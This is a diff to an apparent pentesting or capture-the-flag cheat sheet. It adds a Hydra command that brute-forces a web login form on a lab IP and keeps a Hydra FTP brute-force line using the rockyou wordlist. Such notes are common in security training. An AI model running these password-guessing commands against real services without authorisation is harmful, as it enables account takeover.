@@ -6,6 +6,12 @@ binwalk <image> -e
 <br>
 
 ## Hydra
+### WEB
+```
+hydra -l <username> -P <wordlist> 10.10.0.156 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+```
+
+### FTP
 ```
 hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://<ip>
 ```
